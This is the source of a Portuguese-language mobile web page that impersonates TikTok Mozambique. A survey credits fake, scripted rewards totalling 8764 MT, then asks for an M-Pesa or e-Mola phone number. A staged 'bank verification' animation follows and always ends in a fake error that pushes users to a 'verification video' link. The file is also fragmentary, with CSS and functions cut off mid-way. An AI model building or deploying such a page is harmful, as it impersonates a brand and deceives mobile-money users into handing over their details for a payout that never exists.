<!DOCTYPE html>
<html lang="pt">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover" />
  
  <title>TikTok Money</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    :root {
      --tt-red: #FE2C55;
      --tt-red2: #ff4d6d;
      --tt-blue: #25F4EE;
      --tt-white: #FFFFFF;
      --tt-black: #000000;
      --tt-gray: #111111;
      --tt-gray2: #1a1a1a;
      --tt-gray3: #252525;
      --tt-gray4: #333333;
      --tt-muted: #7a7a7a;
      --tt-border: rgba(255,255,255,0.07);
      --tt-border2: rgba(255,255,255,0.12);
      --safe-b: env(safe-area-inset-bottom, 0px);
      --safe-t: env(safe-area-inset-top, 0px);
    }

    *, *::before, *::after {
      margin: 0; padding: 0; box-sizing: border-box;
      -webkit-tap-highlight-color: transparent;
    }

    html {
      background: var(--tt-black);
      height: 100%;
    }

    body {
      background: var(--tt-black);
      min-height: 100dvh;
      font-family: -apple-system, 'SF Pro Display', 'Helvetica Neue', sans-serif;
      color: var(--tt-white);
      overflow-x: hidden;
      overscroll-behavior: none;
      -webkit-font-smoothing: antialiased;
    }

    /* ── TOPBAR ── */
    .tt-topbar {
      position: fixed;
      top: 0; left: 0; right: 0;
      height: calc(52px + var(--safe-t));
      padding-top: var(--safe-t);
      background: rgba(0,0,0,0.92);
      backdrop-filter: blur(20px);
      -webkit-backdrop-filter: blur(20px);
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding-left: 16px;
      padding-right: 16px;
      z-index: 100;
      border-bottom: 1px solid var(--tt-border);
    }

    .tt-logo {
      display: flex;
      align-items: center;
      gap: 5px;
      font-size: 19px;
      font-weight: 900;
      letter-spacing: -0.5px;
    }

    .tt-logo-icon {
      width: 26px; height: 26px;
      position: relative;
      margin-right: 2px;
    }
    .tt-logo-icon::before {
      content: '';
      position: absolute;
      inset: 1px;
      background: var(--tt-blue);
      border-radius: 5px;
      transform: translate(2px, 2px);
      opacity: 0.7;
    }
    .tt-logo-icon::after {
      content: '';
      position: absolute;
      inset: 1px;
      background: var(--tt-red);
      border-radius: 5px;
      transform: translate(-2px, -2px);
      opacity: 0.7;
    }
    .tt-logo-icon i {
      position: absolute;
      inset: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 14px;
      color: white;
      z-index: 1;
    }

    .tt-logo .r { color: var(--tt-red); }
    .tt-logo .b { color: var(--tt-blue); text-shadow: -2px 0 var(--tt-red); }
    .tt-logo .m { color: var(--tt-muted); font-size: 11px; font-weight: 600; margin-left: 1px; }

    .tt-chip {
      display: flex;
      align-items: center;
      gap: 6px;
      background: var(--tt-gray2);
      border: 1px solid var(--tt-border2);
      border-radius: 20px;
      padding: 5px 12px;
      font-size: 13px;
      font-weight: 800;
      color: var(--tt-white);
      transition: all 0.3s ease;
    }

    .tt-chip .live-dot {
      width: 7px; height: 7px;
      background: var(--tt-red);
      border-radius: 50%;
      animation: livepulse 1.4s ease infinite;
    }

    @keyframes livepulse {
      0%,100% { opacity:1; transform: scale(1); }
      50% { opacity:0.4; transform: scale(0.8); }
    }

    /* ── BOTTOM NAV ── */
    .tt-nav {
      position: fixed;
      bottom: 0; left: 0; right: 0;
      height: calc(54px + var(--safe-b));
      padding-bottom: var(--safe-b);
      background: rgba(0,0,0,0.95);
      backdrop-filter: blur(20px);
      border-top: 1px solid var(--tt-border);
      display: flex;
      align-items: center;
      justify-content: space-around;
      z-index: 100;
    }

    .nav-i {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 2px;
      flex: 1;
      padding: 6px 0;
      opacity: 0.45;
      font-size: 9px;
      font-weight: 700;
      letter-spacing: 0.2px;
      color: var(--tt-white);
    }
    .nav-i.on { opacity: 1; }
    .nav-i i { font-size: 20px; }

    .nav-plus-wrap {
      flex: 1;
      display: flex;
      justify-content: center;
    }

    .nav-plus {
      width: 46px; height: 28px;
      border-radius: 7px;
      position: relative;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
    }
    .nav-plus::before {
      content: '';
      position: absolute;
      inset: 0;
      background: linear-gradient(to right, var(--tt-blue) 50%, var(--tt-red) 50%);
    }
    .nav-plus::after {
      content: '';
      position: absolute;
      inset: 2px;
      background: var(--tt-white);
      border-radius: 5px;
    }
    .nav-plus i { position: relative; z-index: 1; color: var(--tt-black); font-size: 16px; font-weight: 900; }

    /* ── CONTENT COM SCROLL ── */
    .tt-content {
      position: relative;
      padding-top: calc(52px + var(--safe-t));
      padding-bottom: calc(54px + var(--safe-b));
      min-height: 100dvh;
      height: 100dvh;
      overflow-y: auto;
      -webkit-overflow-scrolling: touch;
    }

    .page {
      padding: 14px 15px 24px;
    }

    /* ── PAGE TRANSITION ── */
    @keyframes pageIn {
      from { opacity: 0; transform: translateY(20px) scale(0.99); }
      to   { opacity: 1; transform: translateY(0) scale(1); }
    }
    .page-animate { animation: pageIn 0.35s cubic-bezier(0.22,1,0.36,1) both; }

    /* ── USER BAR ── */
    .u-bar {
      display: flex;
      align-items: center;
      gap: 10px;
      padding: 10px 0 14px;
      margin-bottom: 4px;
    }

    .u-avatar {
      width: 38px; height: 38px;
      border-radius: 50%;
      background: linear-gradient(135deg, var(--tt-red), #ff7b7b);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 17px;
      flex-shrink: 0;
      box-shadow: 0 0 0 2px var(--tt-black), 0 0 0 3.5px var(--tt-red);
    }

    .u-name { font-size: 13px; font-weight: 800; line-height: 1.2; }
    .u-tag { font-size: 11px; color: var(--tt-muted); }

    .u-follow {
      margin-left: auto;
      background: var(--tt-red);
      color: white;
      border: none;
      border-radius: 4px;
      padding: 6px 18px;
      font-size: 13px;
      font-weight: 700;
      cursor: pointer;
      letter-spacing: 0.1px;
      transition: all 0.2s ease;
    }

    .u-follow.following {
      background: var(--tt-gray3);
      color: var(--tt-muted);
    }

    /* ── LANDING ── */
    .land-badge {
      display: inline-flex;
      align-items: center;
      gap: 5px;
      background: rgba(254,44,85,0.1);
      border: 1px solid rgba(254,44,85,0.25);
      color: var(--tt-red);
      font-size: 10px;
      font-weight: 900;
      padding: 8px 14px;
      border-radius: 20px;
      margin-bottom: 12px;
      margin-top: 14px;
      letter-spacing: 0.6px;
    }

    .land-title {
      font-size: 27px;
      font-weight: 900;
      line-height: 1.15;
      margin-bottom: 8px;
      letter-spacing: -0.6px;
    }
    .land-title .hl { color: var(--tt-red); }

    .land-sub {
      font-size: 13px;
      color: var(--tt-muted);
      line-height: 1.55;
      margin-bottom: 20px;
    }

    .stats-row {
      display: grid;
      grid-template-columns: repeat(3,1fr);
      gap: 8px;
      margin-bottom: 20px;
    }

    .stat-box {
      background: var(--tt-gray2);
      border-radius: 10px;
      padding: 12px 6px;
      text-align: center;
      border: 1px solid var(--tt-border);
    }
    .stat-val { font-size: 17px; font-weight: 900; }
    .stat-val.r { color: var(--tt-red); }
    .stat-val.b { color: var(--tt-blue); }
    .stat-lbl { font-size: 9px; color: var(--tt-muted); margin-top: 2px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.3px; }

    /* ── CTA ── */
    .cta-btn {
      width: 100%;
      border: none;
      background: var(--tt-red);
      color: white;
      font-size: 15px;
      font-weight: 800;
      border-radius: 6px;
      padding: 16px;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 9px;
      min-height: 52px;
      position: relative;
      overflow: hidden;
      letter-spacing: 0.2px;
    }
    .cta-btn::after {
      content: '';
      position: absolute;
      top: 0; left: -80%;
      width: 50%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.18), transparent);
      animation: shimmer 2.8s ease infinite;
    }
    @keyframes shimmer { to { left: 160%; } }
    .cta-btn:active { filter: brightness(0.88); transform: scale(0.99); }

    .land-footer {
      text-align: center;
      font-size: 10px;
      color: var(--tt-muted);
      line-height: 1.6;
      margin-top: 20px;
    }
    .land-footer a { color: var(--tt-muted); text-decoration: underline; }

    /* ── DIVIDER ── */
    .divider { border: none; border-top: 1px solid var(--tt-border); margin: 0 0 14px; }

    /* ── PROGRESS ── */
    .prog-wrap { margin-bottom: 16px; }
    .prog-top {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 8px;
    }
    .prog-lbl { font-size: 12px; color: var(--tt-muted); font-weight: 600; }
    .prog-reward {
      display: flex;
      align-items: center;
      gap: 4px;
      background: rgba(254,44,85,0.12);
      border: 1px solid rgba(254,44,85,0.3);
      color: var(--tt-red);
      font-size: 11px;
      font-weight: 800;
      padding: 3px 10px;
      border-radius: 20px;
    }

    .prog-bar {
      width: 100%;
      height: 3px;
      background: var(--tt-gray3);
      border-radius: 2px;
      overflow: hidden;
    }
    .prog-fill {
      height: 100%;
      background: linear-gradient(90deg, var(--tt-red), var(--tt-red2));
      border-radius: 2px;
      transition: width 0.6s cubic-bezier(0.4,0,0.2,1);
    }

    /* ── QUESTION CARD ── */
    .q-card {
      background: var(--tt-gray2);
      border: 1px solid var(--tt-border);
      border-radius: 14px;
      padding: 16px 15px;
      margin-bottom: 12px;
      position: relative;
      overflow: hidden;
    }
    .q-card::before {
      content: '';
      position: absolute;
      top: 0; left: 0;
      width: 3px; height: 100%;
      background: var(--tt-red);
      border-radius: 0 2px 2px 0;
    }

    .q-tag {
      display: inline-flex;
      align-items: center;
      gap: 4px;
      background: rgba(254,44,85,0.12);
      border: 1px solid rgba(254,44,85,0.25);
      color: var(--tt-red);
      font-size: 9px;
      font-weight: 800;
      padding: 2px 9px;
      border-radius: 4px;
      margin-bottom: 8px;
      letter-spacing: 0.7px;
      text-transform: uppercase;
    }

    .q-text {
      font-size: 15.5px;
      font-weight: 700;
      line-height: 1.4;
      color: var(--tt-white);
    }

    /* ── OPTIONS ── */
    .opts { display: flex; flex-direction: column; gap: 9px; }

    .opt-btn {
      width: 100%;
      background: var(--tt-gray2);
      border: 1.5px solid var(--tt-border);
      border-radius: 12px;
      padding: 13px 14px;
      display: flex;
      align-items: center;
      gap: 11px;
      font-size: 13.5px;
      font-weight: 600;
      color: var(--tt-white);
      cursor: pointer;
      text-align: left;
      min-height: 52px;
      transition: border-color 0.15s ease, background 0.15s ease, transform 0.1s ease;
      position: relative;
      overflow: hidden;
    }

    .opt-btn::before {
      content: '';
      position: absolute;
      inset: 0;
      background: var(--tt-red);
      opacity: 0;
      transition: opacity 0.15s;
    }

    .opt-btn:active {
      transform: scale(0.98);
      border-color: var(--tt-red);
    }
    .opt-btn:active::before { opacity: 0.07; }

    .opt-letter {
      width: 26px; height: 26px;
      background: var(--tt-gray3);
      border-radius: 6px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 11px;
      font-weight: 900;
      color: var(--tt-muted);
      flex-shrink: 0;
      position: relative;
    }

    .opt-emoji { font-size: 20px; flex-shrink: 0; position: relative; }

    .opt-txt { flex: 1; position: relative; }

    /* ── REWARD NOTE ── */
    .reward-note {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 7px;
      background: rgba(37,244,238,0.05);
      border: 1px solid rgba(37,244,238,0.15);
      border-radius: 10px;
      padding: 11px;
      margin-top: 14px;
      font-size: 12px;
      font-weight: 700;
      color: var(--tt-blue);
      animation: notepulse 2.5s ease infinite;
    }
    @keyframes notepulse {
      0%,100% { border-color: rgba(37,244,238,0.15); }
      50%      { border-color: rgba(37,244,238,0.4); }
    }

    /* ── MODAL CENTRALIZADO (notificação de ganhos) ── */
    .modal-center {
      position: fixed;
      inset: 0;
      background: rgba(0,0,0,0.85);
      backdrop-filter: blur(12px);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 200;
      animation: fadeInModal 0.25s ease;
    }

    @keyframes fadeInModal {
      from { opacity: 0; }
      to { opacity: 1; }
    }

    .modal-card {
      width: 300px;
      max-width: 85%;
      background: var(--tt-gray);
      border: 1px solid var(--tt-border2);
      border-radius: 28px;
      padding: 28px 20px;
      text-align: center;
      animation: modalPop 0.4s cubic-bezier(0.34, 1.2, 0.64, 1);
      box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
    }

    @keyframes modalPop {
      from {
        opacity: 0;
        transform: scale(0.85) translateY(20px);
      }
      to {
        opacity: 1;
        transform: scale(1) translateY(0);
      }
    }

    .modal-icon {
      width: 70px;
      height: 70px;
      margin: 0 auto 16px;
      background: linear-gradient(135deg, rgba(254,44,85,0.15), rgba(37,244,238,0.1));
      border: 2px solid var(--tt-red);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 32px;
      color: var(--tt-red);
      animation: iconPop 0.5s ease-out;
    }

    @keyframes iconPop {
      0% { transform: scale(0); opacity: 0; }
      50% { transform: scale(1.2); }
      100% { transform: scale(1); opacity: 1; }
    }

    .modal-title {
      font-size: 12px;
      color: var(--tt-muted);
      letter-spacing: 1px;
      font-weight: 600;
      margin-bottom: 8px;
      text-transform: uppercase;
    }

    .modal-amount {
      font-size: 48px;
      font-weight: 900;
      color: var(--tt-white);
      line-height: 1;
      margin-bottom: 8px;
    }

    .modal-amount small {
      font-size: 20px;
      font-weight: 600;
    }

    .modal-sub {
      font-size: 12px;
      color: var(--tt-muted);
      margin-bottom: 20px;
    }

    .modal-divider {
      height: 1px;
      background: var(--tt-border);
      margin: 16px 0;
    }

    .modal-balance-row {
      display: flex;
      justify-content: space-between;
      align-items: center;
      background: var(--tt-gray2);
      border-radius: 14px;
      padding: 12px 16px;
      margin-bottom: 20px;
    }

    .modal-balance-row .label {
      font-size: 13px;
      color: var(--tt-muted);
    }

    .modal-balance-row .value {
      font-size: 20px;
      font-weight: 800;
      color: var(--tt-red);
    }

    .modal-btn {
      width: 100%;
      border: none;
      background: var(--tt-red);
      color: white;
      font-size: 16px;
      font-weight: 800;
      border-radius: 40px;
      padding: 14px;
      cursor: pointer;
      transition: all 0.2s ease;
    }

    .modal-btn:active {
      transform: scale(0.97);
      filter: brightness(0.9);
    }

    /* ── PROCESSING ── */
    .proc-wrap {
      text-align: center;
      padding: 16px 0 10px;
    }

    .proc-ring-outer {
      width: 88px; height: 88px;
      margin: 0 auto 22px;
      position: relative;
    }

    .proc-ring {
      width: 88px; height: 88px;
      border-radius: 50%;
      border: 3px solid var(--tt-gray3);
      border-top-color: var(--tt-red);
      border-right-color: rgba(254,44,85,0.3);
      animation: spin 0.75s linear infinite;
      position: absolute;
      inset: 0;
    }
    .proc-ring2 {
      width: 66px; height: 66px;
      border-radius: 50%;
      border: 2px solid var(--tt-gray3);
      border-bottom-color: var(--tt-blue);
      animation: spin 1.2s linear infinite reverse;
      position: absolute;
      top: 11px; left: 11px;
    }
    .proc-center {
      position: absolute;
      inset: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 26px;
    }

    @keyframes spin { to { transform: rotate(360deg); } }

    .proc-title { font-size: 20px; font-weight: 900; margin-bottom: 5px; }
    .proc-sub { font-size: 12px; color: var(--tt-muted); margin-bottom: 24px; }

    .status-list { display: flex; flex-direction: column; gap: 8px; }

    .st-item {
      background: var(--tt-gray2);
      border: 1px solid var(--tt-border);
      border-radius: 12px;
      padding: 12px 14px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      font-size: 13px;
      color: var(--tt-muted);
      font-weight: 600;
      transition: all 0.4s cubic-bezier(0.22,1,0.36,1);
      animation: stIn 0.4s ease both;
    }
    .st-item:nth-child(1) { animation-delay: 0.05s; }
    .st-item:nth-child(2) { animation-delay: 0.12s; }
    .st-item:nth-child(3) { animation-delay: 0.19s; }
    .st-item:nth-child(4) { animation-delay: 0.26s; }

    @keyframes stIn {
      from { opacity:0; transform: translateX(-12px); }
      to   { opacity:1; transform: translateX(0); }
    }

    .st-item.ok      { border-color: rgba(37,244,238,0.3); background: rgba(37,244,238,0.05); color: var(--tt-blue); }
    .st-item.running { border-color: rgba(254,44,85,0.3);  background: rgba(254,44,85,0.05);  color: var(--tt-red); }

    .st-left { display: flex; align-items: center; gap: 10px; }
    .st-right { font-size: 14px; }

    /* ── RESULT (COM SCROLL GARANTIDO) ── */
    .tt-result {
      display: block;
      width: 100%;
    }

    .result-hero {
      text-align: center;
      padding: 6px 0 16px;
    }

    .trophy-wrap {
      font-size: 54px;
      display: block;
      margin-bottom: 10px;
      animation: trophyIn 0.65s cubic-bezier(0.34,1.5,0.64,1) both;
    }
    @keyframes trophyIn {
      from { transform: scale(0.2) rotate(-15deg); opacity:0; }
      to   { transform: scale(1)   rotate(0deg);   opacity:1; }
    }

    .result-title { font-size: 25px; font-weight: 900; line-height: 1.2; margin-bottom: 5px; letter-spacing: -0.5px; }
    .result-title .r { color: var(--tt-red); }
    .result-sub { font-size: 12px; color: var(--tt-muted); }

    .total-box {
      background: linear-gradient(135deg, rgba(254,44,85,0.11), rgba(37,244,238,0.05));
      border: 1px solid rgba(254,44,85,0.22);
      border-radius: 14px;
      padding: 20px;
      text-align: center;
      margin-bottom: 14px;
      animation: boxIn 0.5s cubic-bezier(0.22,1,0.36,1) 0.1s both;
    }
    @keyframes boxIn {
      from { opacity:0; transform: scale(0.94); }
      to   { opacity:1; transform: scale(1); }
    }

    .total-lbl { font-size: 10px; color: var(--tt-muted); text-transform: uppercase; letter-spacing: 0.6px; margin-bottom: 8px; }
    .total-val { font-size: 50px; font-weight: 900; color: var(--tt-white); line-height: 1; }

    .detail-card {
      background: var(--tt-gray2);
      border: 1px solid var(--tt-border);
      border-radius: 14px;
      padding: 14px;
      margin-bottom: 16px;
      animation: boxIn 0.5s cubic-bezier(0.22,1,0.36,1) 0.18s both;
    }
    .detail-lbl { font-size: 10px; font-weight: 800; color: var(--tt-muted); text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 11px; }

    .detail-row {
      display: flex;
      justify-content: space-between;
      font-size: 13px;
      color: var(--tt-muted);
      padding: 4px 0;
    }
    .detail-row .g { color: #4ade80; font-weight: 700; }
    .detail-row.tot {

<script>
// ══════════════════════════════════
//  CONFIG
// ══════════════════════════════════
const BONUS_INICIAL  = 500; // 500 MT iniciais
const TOTAL_OBJETIVO = 8764; // 8764 MT no total

// Áudio para o popup de ganho
const audioMoney = new Audio();
audioMoney.src = "assets/money.mp3";
audioMoney.volume = 0.6;

function playMoneySound() {
  try {
    audioMoney.currentTime = 0;
    audioMoney.play().catch(e => console.log("Audio play failed:", e));
  } catch(e) { console.log("Audio error:", e); }
}

// Gerar 10 valores aleatórios que somam TOTAL_OBJETIVO - BONUS_INICIAL
function gerarValores() {
  let resto = TOTAL_OBJETIVO - BONUS_INICIAL; // 8764 - 500 = 8264
  let vals = [];
  for (let i = 0; i < 9; i++) {
    let maxPossivel = resto - (9 - i);
    let minValor = Math.max(100, Math.floor(resto / (10 - i) * 0.5));
    let maxValor = Math.min(maxPossivel - 50, Math.floor(resto / (10 - i) * 1.5));
    if (maxValor < minValor) maxValor = minValor + 50;
    let v = Math.floor(Math.random() * (maxValor - minValor + 1) + minValor);
    vals.push(v);
    resto -= v;
  }
  vals.push(resto);
  return vals;
}

let valoresSorteados = gerarValores();

const optionIcons = [
  ["🎵","📺","🔴","⏩"],
  ["🤣","💃","🧠","📱"],
  ["🎤","🎧","🎬","🕺"],
  ["⭐","🔥","💥","🌟"],
  ["💰","🎁","🏆","💎"],
  ["😀","😂","😍","😎"],
  ["🍕","🍔","🌮","🥗"],
  ["⚽","🏀","🎾","🏈"],
  ["🎮","🎲","🎯","🎨"],
  ["🐶","🐱","🐭","🐹"]
];

const letras = ["A","B","C","D"];

// 10 Perguntas sobre TikTok
const perguntas = [
  {
    titulo: "PERGUNTA 1",
    texto: "Com que frequência você abre o TikTok por dia?",
    opcoes: ["Mais de 5 vezes por dia", "2 a 4 vezes por dia", "Uma vez por dia", "Raramente ou nunca"]
  },
  {
    titulo: "PERGUNTA 2",
    texto: "Qual tipo de conteúdo você mais curte no TikTok?",
    opcoes: ["Vídeos engraçados e humor", "Danças e desafios virais", "Tutoriais e dicas úteis", "Lives e transmissões ao vivo"]
  },
  {
    titulo: "PERGUNTA 3",
    texto: "Você já criou ou postou algum vídeo no TikTok?",
    opcoes: ["Sim, posto com frequência", "Sim, mas raramente", "Nunca postei, só assisto", "Não tenho conta no TikTok"]
  },
  {
    titulo: "PERGUNTA 4",
    texto: "Quantos seguidores os seus criadores favoritos do TikTok têm?",
    opcoes: ["Mais de 1 milhão", "Entre 100k e 1 milhão", "Menos de 100 mil", "Não sigo criadores específicos"]
  },
  {
    titulo: "PERGUNTA 5",
    texto: "Como você prefere interagir com vídeos no TikTok?",
    opcoes: ["Dou like e partilho", "Deixo comentários", "Guardo nos favoritos", "Só assisto sem interagir"]
  },
  {
    titulo: "PERGUNTA 6",
    texto: "Qual horário você costuma usar mais o TikTok?",
    opcoes: ["De manhã", "Durante a tarde", "À noite", "Madrugada"]
  },
  {
    titulo: "PERGUNTA 7",
    texto: "Você já comprou algum produto anunciado no TikTok?",
    opcoes: ["Sim, várias vezes", "Sim, uma vez", "Nunca, mas tenho interesse", "Não tenho interesse"]
  },
  {
    titulo: "PERGUNTA 8",
    texto: "O que mais te atrai no TikTok?",
    opcoes: ["Algoritmo de recomendação", "Vídeos curtos e dinâmicos", "Comunidade criativa", "Desafios virais"]
  },
  {
    titulo: "PERGUNTA 9",
    texto: "Você compartilha vídeos do TikTok com amigos?",
    opcoes: ["Sim, frequentemente", "Às vezes", "Raramente", "Nunca"]
  },
  {
    titulo: "PERGUNTA 10",
    texto: "Quanto tempo por dia você passa no TikTok?",
    opcoes: ["Mais de 3 horas", "1-3 horas", "30-60 minutos", "Menos de 30 minutos"]
  }
];

let etapa    = "landing";
let indice   = 0;
let respostas = [];
let metodo   = "M-Pesa";
let telefone = "";
let isFollowing = false; // Estado do botão seguir

function saldoAtual() {
  let s = BONUS_INICIAL;
  for (let i = 0; i < respostas.length; i++) s = s + valoresSorteados[i];
  return s;
}

function fmtMT(n) {
  return n.toFixed(0) + " MT";
}

function updateTopBar() {
  const chip = document.getElementById("topChip");
  const val  = document.getElementById("topVal");
  if (etapa === "landing") { chip.style.display = "none"; return; }
  chip.style.display = "flex";
  const show = (etapa === "resultado" || etapa === "levantamento" || etapa === "erro") ? TOTAL_OBJETIVO : saldoAtual();
  val.textContent = fmtMT(show);
}

// ══════════════════════════════════
//  LANDING
// ══════════════════════════════════
function renderLanding() {
  return `
    <div class="page-animate">
      <div class="u-bar">
        <div class="u-avatar"></div>
        <div>
          <div class="u-name">TikTok</div>

// ══════════════════════════════════
//  QUIZ
// ══════════════════════════════════
function renderQuiz() {
  const p     = perguntas[indice];
  const icons = optionIcons[indice];
  const pct   = ((indice + 1) / perguntas.length) * 100;
  const ganho = valoresSorteados[indice];

  const opts = p.opcoes.map((txt, i) => `

      <span class="opt-letter">${letras[i]}</span>
      <span class="opt-emoji">${icons[i]}</span>
      <span class="opt-txt">${txt}</span>

  `).join("");

  return `
    <div class="page-animate">
      <div class="u-bar">
        <div class="u-avatar"></div>
        <div>
          <div class="u-name">TikTok</div>
          <div class="u-tag">@tiktok · Patrocinado</div>

        </div>
        <div class="prog-bar">
          <div class="prog-fill" style="width:${pct}%"></div>
        </div>
      </div>

      <div class="q-card">
        <div class="q-tag"><i class="fab fa-tiktok" style="font-size:8px;"></i> ${p.titulo}</div>
        <div class="q-text">${p.texto}</div>

    </div>
  `;
}

//  MODAL CENTRALIZADO (notificação de ganhos)
// ══════════════════════════════════

// ══════════════════════════════════
//  RESULT (com scroll garantido - botão visível)
// ══════════════════════════════════
function renderResultado() {
  const total = TOTAL_OBJETIVO;
  const rows  = valoresSorteados.map((v, i) =>
    `<div class="detail-row"><span>Pergunta ${i+1}</span><span class="g">+${fmtMT(v)}</span></div>`
  ).join("");

  return `
    <div class="page-animate tt-result">
      <div class="result-hero">
        <span class="trophy-wrap">🏆</span>
        <div class="result-title">Parabéns! <span class="r">Você ganhou!</span></div>
        <div class="result-sub">Completou todas as perguntas com sucesso!</div>
      </div>

      <div class="total-box">
        <div class="total-lbl">SALDO DISPONÍVEL PARA LEVANTAMENTO</div>
        <div class="total-val">${fmtMT(total)}</div>
      </div>

      <div class="detail-card">
        <div class="detail-lbl"><i class="fas fa-chart-bar"></i> DETALHES DO SALDO</div>
        <div class="detail-row"><span>Bónus inicial</span><span style="font-weight:800;">+${fmtMT(BONUS_INICIAL)}</span></div>
        ${rows}
        <div class="detail-row tot"><span>Total</span><span class="r">${fmtMT(total)}</span></div>
      </div>

      <button class="btn-white" id="withdrawBtn">
        <i class="fas fa-money-bill-wave"></i> LEVANTAR AGORA
      </button>
      <div class="small-note">⏰ Oferta expira em breve · Disponível por 24h</div>
    </div>
  `;
}

// ══════════════════════════════════
//  WITHDRAW (com valor em Metical)
// ══════════════════════════════════
function renderLevantamento() {
  const total   = TOTAL_OBJETIVO;
  const isValid = telefone.length === 9 && /^\d+$/.test(telefone);
  return `
    <div class="page-animate">
      <div class="u-bar">
        <div class="u-avatar"></div>
        <div>
          <div class="u-name">Tiktok Moçambique</div>
          <div class="u-tag">@tiktok_mz · Patrocinado</div>
        </div>
      </div>

      <div class="wd-title">Levantar <span class="r">dinheiro</span></div>
      <div class="wd-sub">Escolha o método e insira o número</div>

      <div class="amt-box">
        <div class="lbl">Valor a levantar</div>
        <div class="val">${fmtMT(total)}</div>
        <div class="val-mzn"><i class="fas fa-money-bill"></i> ${fmtMT(total)}</div>
      </div>

      <div class="sec-lbl"><i class="fas fa-credit-card"></i> MÉTODO DE PAGAMENTO</div>
      <div class="method-grid">
        <div class="method-card ${metodo==='M-Pesa'?'sel':''}" data-method="M-Pesa">
          <img class="method-img" src="assets/mpesa.png" alt="M-Pesa" onerror="this.style.display='none'; this.parentElement.innerHTML='<i class=\\'fas fa-mobile-alt\\' style=\\'font-size: 32px;\\'></i>'">
          <div class="mn">M-Pesa</div>
        </div>
        <div class="method-card ${metodo==='e-Mola'?'sel':''}" data-method="e-Mola">
          <img class="method-img" src="assets/emola.png" alt="e-Mola" onerror="this.style.display='none'; this.parentElement.innerHTML='<i class=\\'fas fa-university\\' style=\\'font-size: 32px;\\'></i>'">
          <div class="mn">e-Mola</div>
        </div>
      </div>

      <div class="sec-lbl"><i class="fas fa-phone-alt"></i> NÚMERO DE TELEMÓVEL</div>
      <div class="inp-wrap">
        <div class="prefix">+258</div>
        <input type="tel" class="phone-inp" id="phoneInput" value="${telefone}" placeholder="8X XXX XXXX" maxlength="9" inputmode="numeric" />
      </div>

      <button class="pay-btn ${isValid?'on':''}" id="payBtn" ${!isValid?'disabled':''}>
        <i class="fas fa-lock"></i> PROCESSAR PAGAMENTO
      </button>
      <div class="secure-note">🔒 Pagamento seguro e encriptado</div>
    </div>
  `;
}

// ══════════════════════════════════
//  PAYMENT ANIMATION (antes do erro)
// ══════════════════════════════════
function showPayAnimation() {
  const overlay = document.createElement("div");
  overlay.className = "pay-anim-overlay";
  overlay.id = "payAnim";
  overlay.innerHTML = `
    <div class="pay-anim-ring">
      <div class="pa-inner"><i class="fas fa-lock"></i></div>
    </div>
    <div class="pay-anim-label" id="paLabel">Conectando ao servidor...</div>
    <div class="pay-anim-steps">
      <div class="pa-step" id="pa1"><span class="pa-icon">🔐</span> Criptografando dados...</div>
      <div class="pa-step" id="pa2"><span class="pa-icon">🏦</span> Contactando o banco...</div>
      <div class="pa-step" id="pa3"><span class="pa-icon">✅</span> Verificando conta...</div>
    </div>
  `;
  document.body.appendChild(overlay);

  const labels = ["Conectando ao servidor...", "Validando pagamento...", "A processar transferência..."];
  const steps  = ["pa1","pa2","pa3"];
  let li = 0;

  const labelEl = document.getElementById("paLabel");

  const intv = setInterval(() => {
    li++;
    if (li < labels.length && labelEl) labelEl.textContent = labels[li];
  }, 900);

  steps.forEach((id, i) => {
    setTimeout(() => {
      const el = document.getElementById(id);
      if (el) { el.classList.add("show"); setTimeout(() => el.classList.add("ok"), 300); }
    }, 500 + i * 800);
  });

  setTimeout(() => {
    clearInterval(intv);
    overlay.remove();
    etapa = "erro";
    render();
  }, 3400);
}

// ══════════════════════════════════
//  ERROR
// ══════════════════════════════════
function renderErro() {
  return `
    <div class="page-animate">
      <div class="err-icon"><i class="fas fa-exclamation-triangle"></i></div>
      <div class="err-title">Erro no processamento</div>
      <div class="err-sub">Ocorreu um problema ao processar o seu saque. O seu saldo está seguro.</div>

      <div class="alert-box">
        <i class="fas fa-shield-alt"></i>
        <div>
          <div class="alert-title">Erro de verificação</div>
          <div class="alert-text">A sua conta precisa ser verificada antes de receber pagamentos. Assista ao vídeo abaixo para desbloquear o saque.</div>
        </div>
      </div>

      <div class="vid-unlock">
        <div class="vid-badge"><i class="fas fa-video"></i> PARA DESBLOQUEAR O SAQUE:</div>
        <div class="vid-title">Assista ao vídeo de verificação</div>
        <div class="vid-feats">
          <span><i class="fas fa-clock"></i> 30 segundos</span>
          <span><i class="fas fa-unlock-alt"></i> Desbloqueio imediato</span>
        </div>
        <a href="./verifique/" class="vid-btn">
          <i class="fas fa-play"></i> ASSISTIR VÍDEO <i class="fas fa-arrow-right"></i>
        </a>
      </div>
    </div>
  `;
}

// ══════════════════════════════════
//  PROCESSING ANIMATION
// ══════════════════════════════════
function iniciarProcessamento() {
  const activate = (id, cls, delay) => {
    setTimeout(() => {
      const el = document.getElementById(id);
      if (!el) return;
      el.classList.add(cls);
      const r = el.querySelector(".st-right");
      if (r) r.innerHTML = cls === "ok"
        ? "<i class='fas fa-check' style='color:var(--tt-blue)'></i>"
        : "<i class='fas fa-sync-alt fa-spin' style='color:var(--tt-red)'></i>";
    }, delay);
  };
  activate("s1","ok", 400);
  activate("s2","ok", 1200);
  activate("s3","running", 2000);
  activate("s4","ok", 2800);
